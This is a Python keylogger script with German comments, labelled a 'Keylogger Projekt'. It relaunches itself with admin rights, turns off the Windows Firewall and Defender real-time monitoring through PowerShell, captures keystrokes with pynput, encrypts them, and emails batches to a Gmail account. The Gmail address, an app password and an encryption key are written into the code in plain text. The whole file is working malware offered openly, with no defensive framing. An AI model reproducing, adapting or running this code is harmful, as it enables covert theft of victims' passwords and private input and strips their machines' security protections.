"""
Author: Leon Huskaj
Date: 28.02.2025
Version: 3.0
Description: Keylogger Projekt
Dieser Code sendet die Keystrokes per E-Mail und deaktiviert Sicherheitsmechanismen.
"""

# Bibliotheken imports
import smtplib
import ssl
import subprocess
import os
from datetime import datetime
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import ctypes

# Prüfen, ob das Skript mit Admin-Rechten läuft
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

# Firewall und Defender deaktivieren
def disable_protection():
    try:
        subprocess.run(["powershell", "-Command", "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"], check=True, shell=True)
        subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], check=True, shell=True)
        print("Windows Defender & Firewall wurden deaktiviert.")
    except subprocess.CalledProcessError as e:
        print(f"Fehler beim Deaktivieren der Schutzmechanismen: {e}")

# Schlüssel von --> key.key
ENCRYPTION_KEY = b'kNryyxr5cPQqaIJ__DCIzzZ0Rrp7KRj4lT1-zML5KRw='
cipher = Fernet(ENCRYPTION_KEY)

# E-Mail Konfiguration
EMAIL_SENDER = "leon.huskaj1212@gmail.com"
EMAIL_PASSWORD = "okzk edtt lsaq husd"
EMAIL_RECEIVER = "leon.huskaj1212@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465

# Keylogger Variablen
keystrokes = []
THRESHOLD = 100

# Verschlüsselung der Nachricht
def encrypt_message(message: str) -> str:
    encrypted_bytes = cipher.encrypt(message.encode())
    return encrypted_bytes.decode()

# Mail senden
def send_email():
    global keystrokes
    if not keystrokes:
        return

    plaintext = ''.join(keystrokes)
    encrypted_text = encrypt_message(plaintext)

    message = f"Subject: Keylogger Report\n\n{encrypted_text}"

    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, context=context) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, message)
        print("E-Mail erfolgreich gesendet.")
    except Exception as e:
        print(f"Fehler beim Senden der E-Mail: {e}")

    keystrokes = []

# Tasteneingaben erfassen
def on_press(key):
    global keystrokes

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        key_data = f"{timestamp} - {key.char}\n"
    except AttributeError:
        key_data = f"{timestamp} - [{key}]\n"

    keystrokes.append(key_data)

    # E-Mail senden, wenn Schwellwert erreicht
    if len(keystrokes) >= THRESHOLD:
        send_email()

# Skript-Start
def main():
    if not is_admin():
        print("Starte Skript mit Admin-Rechten...")
        subprocess.run(["powershell", "-Command", f"Start-Process python -ArgumentList '{__file__}' -Verb RunAs"], shell=True)
        return

    disable_protection()
    
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
